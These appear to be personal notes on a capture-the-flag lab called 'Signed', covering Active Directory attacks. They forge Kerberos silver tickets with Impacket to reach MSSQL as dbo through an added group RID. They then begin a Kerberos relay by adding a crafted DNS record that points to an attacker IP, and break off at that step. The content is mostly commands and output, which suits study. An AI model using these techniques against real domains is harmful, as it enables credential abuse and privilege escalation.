# signed lab

**if LDAP or SMB signing is not enforeced we can see there’s high chances for reflection or relay attacks in network.**

#### TGS as mssqlsvc

I’ll start by proving I can forge a ticket for a user I know, mssqlsvc. To create a ticket, I’ll need:

- The NTLM hash of the service account password.
- The domain SID

To get the NTLM, I’ll use Python with the plaintext password:

```python
oxdf@hacky$python3 -c 'import hashlib; print(hashlib.new("md4", "<SERVICE_ACCOUNT_PASSWORD>".encode("utf-16le")).hexdigest())'
<SERVICE_ACCOUNT_NT_HASH>
```

To get the domain SID, I’ll fetch a SID from the DB:

```bash
SQL (SIGNED\mssqlsvc  guest@master)>SELECT SUSER_SID('SIGNED\Domain Users');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'
```

The raw SID is a binary structure in little-endian format. Here’s how to parse it:

| Bytes | Field | Value |
| --- | --- | --- |
| `01` | Revision | 1 |
| `05` | Sub-authority count | 5 |
| `000000000005` | Identifier authority | 5 (NT Authority) |
| `15000000` | Sub-auth 1 | 0x00000015 = 21 |
| `5b7bb0f3` | Sub-auth 2 | 0xf3b07b5b = 4088429403 |
| `98aa2245` | Sub-auth 3 | 0x4522aa98 = 1159899800 |
| `ad4a1ca4` | Sub-auth 4 | 0xa41c4aad = 2753317549 |
| `01020000` | Sub-auth 5 | 0x00000201 = 513 (Domain Users RID) |

Putting that all together makes 
S-1-5-21-4088429403-1159899800-2753317549-513, and the domain SID will 
be that without the RID at the end: 
S-1-5-21-4088429403-1159899800-2753317549.

Python can do this using a tool from [Impacket](https://github.com/SecureAuthCorp/impacket):

```python
>>>from impacket.dcerpc.v5.dtypes import SID
>>>SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical()
'S-1-5-21-4088429403-1159899800-2753317549-513'
```

Putting that together forges a ticket:

```python
oxdf@hacky$ticketer.py -nthash <SERVICE_ACCOUNT_NT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn MSSQLSvc/<SQL_HOST>:1433 mssqlsvc
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

I can use that to connect to MSSQL:

```python
oxdf@hacky$KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -no-pass -k DC01.signed.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commandsSQL (SIGNED\mssqlsvc  guest@master)>
```

It’s as the mssqlsvc user:

```sql
SQL (SIGNED\mssqlsvc  guest@master)>select SUSER_SNAME(), ORIGINAL_LOGIN();

-------------------   -------------------
SIGNED.HTB\mssqlsvc   SIGNED.HTB\mssqlsvc
```

#### TGS with IT Group

The IT group has sysadmin privileges on the database. When a user 
authenticates using Kerberos, they authenticate to the DC which 
generates the TGS with all the information about the user, including 
their groups, and encrypts it with the NTLM of the service account that 
will receive it. When I’m forging a silver ticket using the service’s 
NTLM, I can add groups to the forged ticket.

I’ll get the SID for the IT group:

```sql
SQL (SIGNED\Administrator  guest@master)>select SUSER_SID('Signed\IT')

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```

That’s RID 1105:

```bash
oxdf@hacky$python -c 'print(0x451)'
1105
```

I’ll add `-groups 1105` to the ticket:

```bash
oxdf@hacky$ticketer.py -nthash <SERVICE_ACCOUNT_NT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn MSSQLSvc/<SQL_HOST>:1433 -groups <GROUP_RID> Administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

And connect:

```bash
oxdf@hacky$KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commandsSQL (SIGNED\Administrator  dbo@master)>
```

Right away it’s showing dbo as the user, rather than guest!

#### Strategy

I’ll abuse a similar strategy to what I showed in [DarkCorp](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html#shell-as-administratorweb-01), coercing an authentication attempt from the DC to me using an empty `CREDENTIAL_TARGET_INFORMATION` structure. This strategy, described in depth in [this Synactiv post](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx)  shows how I can create a DNS record that will point to a host I control without conflicting with the existing DC01 record, but that within Kerberos will be interpreted as if it is DC01. This allows me to act as if I’m DC01.

so like it’s one of the coercion method by adding a dns record and pointing it to a host we control.

#### Generate DNS Record

I’ll use `dnstool.py` (from [krbrelayx](https://github.com/dirkjanm/krbrelayx)) to create a DNS record on the domain with the following options:

- `u '<DOMAIN>\<USER>' -p '<PASSWORD>'` - user to authenticate as
- `a add` - add record
- `r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` - domain to add
- `d 10.10.14.16` - the value for the domain
- `10.129.242.173` - host to send this request.

-r here results to dc01 that’s the record and it’s pointing to our ip, and when kerberos tries to resolve it and we try to communicate with it, it thinks we’re dc01 .